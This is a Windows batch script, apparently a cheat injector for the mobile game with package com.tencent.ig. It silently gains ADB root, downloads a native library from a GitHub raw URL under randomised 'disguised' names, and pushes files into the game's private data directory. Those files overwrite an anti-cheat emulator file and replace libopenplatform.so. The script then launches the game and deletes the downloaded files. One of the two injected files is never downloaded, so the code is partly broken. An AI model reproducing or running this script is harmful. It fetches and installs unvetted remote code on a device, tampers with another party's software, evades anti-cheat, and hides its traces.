@echo off
@cd/d "%~dp0"

:: Kill any existing ADB server and set up root access silently
adb kill-server >nul 2>&1
adb root >nul 2>&1

:: Generate random names for downloaded files
setlocal enabledelayedexpansion
set "ENCODED_FILE1=%TEMP%\!RANDOM!!RANDOM!.enc"
set "ENCODED_FILE2=%TEMP%\!RANDOM!!RANDOM!.enc"

:: Download files with disguised names

curl -s -o "!ENCODED_FILE2!" "https://raw.githubusercontent.com/Error111112/HBP/refs/heads/main/libmario.so" >nul 2>&1

:: Create required directories silently

adb shell mkdir -p /data/data/com.tencent.ig/lib >nul 2>&1

:: Rename and inject the first file
set Count=0
set MaxAttempts=5
:REPEAT_INJECTION
set /a Count+=1
adb push "!ENCODED_FILE1!" /data/data/com.tencent.ig/files/ano_tmp/ano_emu_c2.dat >nul 2>&1
if %Count% geq %MaxAttempts% goto INJECT_SECOND_FILE
timeout /t 1 >nul
goto REPEAT_INJECTION

:INJECT_SECOND_FILE
:: Rename and inject the second file
adb push "!ENCODED_FILE2!" /data/data/com.tencent.ig/lib/libopenplatform.so >nul 2>&1

:: Launch the game silently
adb shell monkey -p com.tencent.ig -c android.intent.category.LAUNCHER 1 >nul 2>&1

:: Clean up disguised files
del "!ENCODED_FILE1!" >nul 2>&1
del "!ENCODED_FILE2!" >nul 2>&1

:: Exit silently
exit
